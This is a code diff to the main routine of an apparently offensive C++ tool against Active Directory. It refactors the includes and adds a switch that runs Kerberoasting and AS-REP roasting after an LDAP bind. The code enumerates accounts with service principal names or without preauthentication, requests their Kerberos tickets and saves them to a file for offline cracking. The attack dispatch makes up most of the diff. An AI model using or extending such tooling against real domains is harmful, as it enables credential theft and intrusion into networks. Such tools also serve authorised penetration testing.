@@ -2,9 +2,11 @@
 #include <vector>
 #include <string>
 #include <ldap.h>
-#include "LDAPConnection.h"
-#include "ArgumentParser.h"
-#include "Attacks.h"
+#include "connections/LDAPConnection.h"
+#include "cli/ArgumentParser.h"
+#include "attacks/Attacks.h"
+#include "connections/KerberosInteraction.h"
+#include "utils/Utils.h"
 
 const char* const COLOR_RED   = "\033[91m";
 const char* const COLOR_GREEN = "\033[92m";
@@ -37,21 +39,37 @@ int main(int argc, char* argv[]) {
     if (connection.bind(username, password)) {
         std::cout << COLOR_GREEN << "[*] Authenticated successfully \t\t\t" << username << ":" << password << COLOR_RESET << std::endl;
         if (parser.getAttackMethod() == AttackMethod::NONE) {
-            
-        } else if (parser.getAttackMethod() == AttackMethod::KERBEROAST) {
-            Attacks::Kerberoast krbroast(connection);
-            std::vector<std::string> spns = krbroast.listUser(baseDN);
-            for (std::string target : spns) {
-                krbroast.requestTicket(target, "Administrator", password);
+            KerberosInteraction krb5;
+            krb5.requestTGT(username, password);
+        } else {
+            AttackMethod _att = parser.getAttackMethod();
+            switch (_att) {
+                case AttackMethod::KERBEROAST: {
+                    Attacks::Kerberoast krbroast(connection);
+                    KerberosInteraction krb5;
+                    krb5.requestTGT(username, password);
+                    std::vector<std::string> spns = krbroast.listUser(baseDN);
+                    std::vector<std::pair<std::string, std::string>> to_save;
+                    for (std::string target : spns) {
+                        to_save.emplace_back(krbroast.requestTicket(target, username, !parser.getFilePath().empty()));
+                    }
+                    Utils::saveToFile(to_save, parser.getFilePath());
+                    break;
+                }
+                case AttackMethod::ASREPROAST: {
+                    Attacks::ASREPRoast asreproast(connection);
+                    std::vector<std::string> vuln_users = asreproast.listUser(baseDN);
+                    for (const std::string& vuln : vuln_users) {
+                        asreproast.requestTicket(vuln);
+                    }
+                    break;
+                }
+                default:
+                    break;
             }
-        } else if (parser.getAttackMethod() == AttackMethod::ASREPROAST) {
-            Attacks::ASREPRoast asreproast(connection);
-            std::vector<std::string> vuln_users = asreproast.listUser(baseDN);
-            for (const std::string& vuln : vuln_users) {
-                asreproast.requestTicket(vuln);
-            }
+                
+            std::cout << COLOR_BLUE << "\nFinishing attack" << COLOR_RESET;
         }
-        std::cout << COLOR_BLUE << "\nFinishing attack" << COLOR_RESET;
     } else {
         std::cout << COLOR_RED << "[-] Authentication failed \t" << username << ":" << password << COLOR_RESET << std::endl;
     }
